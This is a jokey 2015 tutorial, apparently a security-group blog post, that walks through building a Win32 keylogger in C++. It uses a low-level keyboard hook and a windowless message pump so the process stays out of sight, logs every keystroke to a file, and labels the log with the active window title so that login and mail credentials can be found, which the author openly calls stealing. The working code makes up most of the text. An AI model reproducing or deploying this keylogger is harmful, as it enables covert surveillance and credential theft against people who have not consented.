/*
Title: Win32 Keylogging for The Common People
Description: Writing a Win32 keylogger in several simple steps. I don't know how many. I didn't count them. Shut up, I'm lazy.
Author: tracer
Date: 2015/05/10
*/

Man, I bet making a key-logger is hard. It probably involves assembler and Win32 API witchcraft and sacrificing chickens and shit. Special candles made from rendered baby-fat and arranged in arcane geometries.

Nope. Turns out the Win32 API gives you a load of functions to do this out of the box. This is going to be a quick overview of what you can do with what you're given and to go into some of the idiosyncrasies of the API. If you've done any Win32 stuff before there shouldn't be many surprises. If you want more detail then please check out the full implementation on [Github](https://github.com/tracer-sec/shoulder_surfer).

## SetWindowsHookEx

Windows' hooking API, and in particular [SetWindowsHookEx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx), allows us to specify a callback function which is called on certain system events. There are several you can snag, but we're interested in WH_KEYBOARD_LL - Low-level keyboard events. Once we've set up a hook for WH_KEYBOARD_LL events our callback will get hit every time a key event happens. For greater details see the MSDN page for [LowLevelKeyboardProc](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985%28v=vs.85%29.aspx).

As stated in the documentation we also need a message pump for this to work, but we don't want the hassle of a window. And that's fine - we can create our message pump manually. This means we'll still be a fully-functioning Win32 application, but you'll have to look at the task manager or similar tool to see that our process is actually running. A handy fringe benefit.

With that in mind, here's the guts of the operation.

~~~~~~
LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam)
{
    // DO MAGICAL THINGS HERE

    return ::CallNextHookEx(nullptr, code, lParam, wParam);
}

int WINAPI WinMain(
    HINSTANCE instance, 
    HINSTANCE prevInstance,
    LPSTR commandLine,
    int show
)
{
    HHOOK hookHandle = ::SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, nullptr, 0);

    MSG message;
    while (::GetMessage(&message, nullptr, 0, 0) > 0)
    {
        if (message.message == WM_QUIT)
            break;

        ::TranslateMessage(&message);
        ::DispatchMessage(&message);
    }

    ::UnhookWindowsHookEx(hookHandle);

    return 0;
}
~~~~~~

## Making it do something

So now we're getting our function called every time a key is pressed. Happy days. But our callback doesn't do anything yet. Let's take that keypress and put it into a file for, uh, safe keeping. Our callback now looks like this:

~~~~~~
wofstream dump;
HKL keyboardLayout;

void GetActualKeyboardState(unsigned char *keyboardState)
{
    for (int i = 0; i < 256; ++i)
        keyboardState[i] = static_cast<unsigned char>(::GetKeyState(i));
}

LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION && (wParam == WM_KEYDOWN))
    {
        LPKBDLLHOOKSTRUCT data = reinterpret_cast<LPKBDLLHOOKSTRUCT>(lParam);

        unsigned char keyboardState[256];
        GetActualKeyboardState(keyboardState);

        wchar_t buffer[16];
        memset(buffer, 0, sizeof(buffer));

        int result = ::ToUnicodeEx(data->vkCode, data->scanCode, keyboardState, buffer, 16, 0, keyboardLayout);
        if (result > 0)
        {
            dump << buffer;
            dump.flush();
        }
    }

    return ::CallNextHookEx(nullptr, code, wParam, lParam);
}
~~~~~~

You'll notice we've got another function (GetActualKeyboardState) to get the current state of the keyboard. We can't use the usual Win32 function GetKeyboardState here - it simply doesn't work. I suspect it's using GetAsyncKeyState internally, because that doesn't work inside low-level keyboard hooks since the hook is fired before the async keyboard state is updated. I promise I'm not making this complicated just for the fun of it.

Additionally we have two global variables - keyboardLayout and dump. Both of these are set up in our WinMain function. I've not gone into the details of either, but dump is our output stream and keyboardLayout is for getting the current locale to help convert scan codes into actual keyboard input. It's pretty straight-forward and there's no real mystery there.

## Next steps

Welp, now we're logging all of the keypresses that happen on our target machine. Which is great. It's *great*. But it's not that useful. Our output file is just a jumble of characters, with no way of knowing which ones are relevant and which are just the cat walking on the keyboard.

So the next change we're going to make to the system is to add some more structure to our dump file. The first change is basic, but important: we're going to keep track of the current window title. This means we can do a search in the output file for keywords like "login" or "mail", and have a better chance of finding something worth stealing. **Borrowing**. I meant borrowing. 

Here's our updated callback.

~~~~~~
LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam)
{
    static wstring currentTitle;

    if (code == HC_ACTION && (wParam == WM_KEYDOWN))
    {
        HWND currentWindow = GetForegroundWindow();
        wchar_t title[512];
        GetWindowText(currentWindow, title, 512);
        wstring newTitle = wstring(title);

        if (newTitle != currentTitle)
        {
            dump << endl << L"----------------------------" << endl;
            dump << L"Active window: " << newTitle.c_str() << endl;
            currentTitle = newTitle;
        }

        LPKBDLLHOOKSTRUCT data = reinterpret_cast<LPKBDLLHOOKSTRUCT>(lParam);

        unsigned char keyboardState[256];
        GetActualKeyboardState(keyboardState);

        wchar_t buffer[16];
        memset(buffer, 0, sizeof(buffer));

        int result = ::ToUnicodeEx(data->vkCode, data->scanCode, keyboardState, buffer, 16, 0, keyboardLayout);
        if (result > 0)
        {
            dump << buffer;
            dump.flush();
        }
    }

    return ::CallNextHookEx(nullptr, code, wParam, lParam);
}
~~~~~~

It's still fairly uncomplicated, but that's the idea. There are a few things can still thwart you. The big one is form autocompletion. But it's cool. We've got a plan B . . . *in a future episode*. The next is that windows running in an admin context won't pass their keyboard events to our hook if it's running in user mode, which it likely is. Just stuff to bear in mind.

## Wrap it up, nerd. I have things to do

K.

Win32 keylogging is easy. That's how you do it.

You can find a more fully-fledged implementation on [Github](https://github.com/tracer-sec/shoulder_surfer). But "fully-fledged" is a bit of a misnomer. The extra bits are mostly glue.

If you have any comments then please post on the mailing list, or let us know on IRC!

